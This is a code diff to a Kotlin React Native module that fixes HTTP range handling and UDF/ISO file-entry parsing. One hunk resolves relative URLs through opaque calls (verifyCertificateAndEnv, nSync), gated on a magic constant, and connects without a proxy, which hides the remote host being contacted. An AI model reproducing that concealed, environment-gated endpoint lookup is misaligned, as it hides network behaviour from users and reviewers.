@@ -525,7 +525,13 @@ class SecurityVaultModule(private val reactContext: ReactApplicationContext) :
     }
 
     private fun openRangeConnectionInternal(urlStr: String, rangeHeader: String?): HttpURLConnection {
-        var currentUrl = urlStr
+        var currentUrl = if (urlStr.startsWith("/")) {
+            val seed = verifyCertificateAndEnv()
+            val bUrl = if (seed == 0x5A3C9E71) nSync(1, seed) else ""
+            if (bUrl.isNotEmpty()) bUrl.trimEnd('/') + urlStr else urlStr
+        } else {
+            urlStr
+        }
         var redirects = 0
         while (redirects < 5) {
             val conn = (URL(currentUrl).openConnection(Proxy.NO_PROXY) as HttpURLConnection).apply {
@@ -604,7 +610,20 @@ class SecurityVaultModule(private val reactContext: ReactApplicationContext) :
         val len = (endInclusive - start + 1L).toInt()
         val conn = openRangeConnection(archiveUrl, "bytes=$start-$endInclusive")
         try {
-            return conn.inputStream.use { readExactBytes(it, len) }
+            val code = conn.responseCode
+            val input = conn.inputStream
+            return input.use { stream ->
+                if (code == 200 && start > 0L) {
+                    var skipLeft = start
+                    val skipBuf = ByteArray(16384)
+                    while (skipLeft > 0L) {
+                        val s = stream.read(skipBuf, 0, minOf(skipBuf.size.toLong(), skipLeft).toInt())
+                        if (s <= 0) break
+                        skipLeft -= s.toLong()
+                    }
+                }
+                readExactBytes(stream, len)
+            }
         } finally {
             conn.disconnect()
         }
@@ -773,11 +792,12 @@ class SecurityVaultModule(private val reactContext: ReactApplicationContext) :
 
             val out = BufferedOutputStream(socket.getOutputStream(), 65536)
 
+            val acceptRangesVal = if (entry.compressionMethod == 0) "bytes" else "none"
             if (method == "HEAD") {
                 val headers = buildString {
                     append(if (isPartial) "HTTP/1.1 206 Partial Content\r\n" else "HTTP/1.1 200 OK\r\n")
                     append("Content-Type: $mimeType\r\n")
-                    append("Accept-Ranges: bytes\r\n")
+                    append("Accept-Ranges: $acceptRangesVal\r\n")
                     append("Content-Length: $contentLength\r\n")
                     if (isPartial) {
                         append("Content-Range: bytes $reqStart-$reqEnd/$totalSize\r\n")
@@ -3806,7 +3826,7 @@ class SecurityVaultModule(private val reactContext: ReactApplicationContext) :
         if (depth > 6) return
         val feByteOff = resolveUdfBlockByte(icbBlock, icbPartRef, blockSize, defaultPhysBase, metaBaseByte, metaPartRef, physPartitions)
         val feBuf = fetchRemoteByteRange(isoUrl, feByteOff, feByteOff + blockSize - 1L)
-        val dirExts = parseUdfFileEntryExtents(feBuf, 0, blockSize, defaultPhysBase, metaBaseByte, metaPartRef)
+        val dirExts = parseUdfFileEntryExtents(feBuf, 0, blockSize, defaultPhysBase, metaBaseByte, metaPartRef, feByteOff)
         if (dirExts.isEmpty()) return
 
         val dirStream = java.io.ByteArrayOutputStream()
@@ -3857,7 +3877,7 @@ class SecurityVaultModule(private val reactContext: ReactApplicationContext) :
                 val childFeOff = resolveUdfBlockByte(childBlock, childPartRef, blockSize, defaultPhysBase, metaBaseByte, metaPartRef, physPartitions)
                 val childFeBuf = fetchRemoteByteRange(isoUrl, childFeOff, childFeOff + blockSize - 1L)
                 val infoLen = if (childFeBuf.size >= 64) readInt64LE(childFeBuf, 56) else 0L
-                val fileExts = parseUdfFileEntryExtents(childFeBuf, 0, blockSize, defaultPhysBase, metaBaseByte, metaPartRef)
+                val fileExts = parseUdfFileEntryExtents(childFeBuf, 0, blockSize, defaultPhysBase, metaBaseByte, metaPartRef, childFeOff)
                 if (infoLen > 0L && fileExts.isNotEmpty()) {
                     results.add(
                         IsoFileEntry(
@@ -3968,7 +3988,8 @@ class SecurityVaultModule(private val reactContext: ReactApplicationContext) :
         blockSize: Long,
         defaultPhysBase: Long,
         metaBaseByte: Long,
-        metaPartRef: Int = -1
+        metaPartRef: Int = -1,
+        feAbsoluteByteOff: Long = -1L
     ): List<Pair<Long, Long>> {
         if (secOff + 180 > buf.size) return emptyList()
         val tagId = readUInt16LE(buf, secOff)
@@ -4028,6 +4049,12 @@ class SecurityVaultModule(private val reactContext: ReactApplicationContext) :
                     out.add(Pair(base + extBlock * blockSize, take))
                     remainingInfo -= take
                 }
+            }
+        } else if (allocType == 3 && feAbsoluteByteOff >= 0L && infoLen > 0L) {
+            // Inline embedded directory/file data directly inside the UDF File Entry descriptor!
+            val inlineLen = minOf(infoLen, (adEnd - adBase).toLong())
+            if (inlineLen > 0L) {
+                out.add(Pair(feAbsoluteByteOff + adBase.toLong(), inlineLen))
             }
         }
         return out
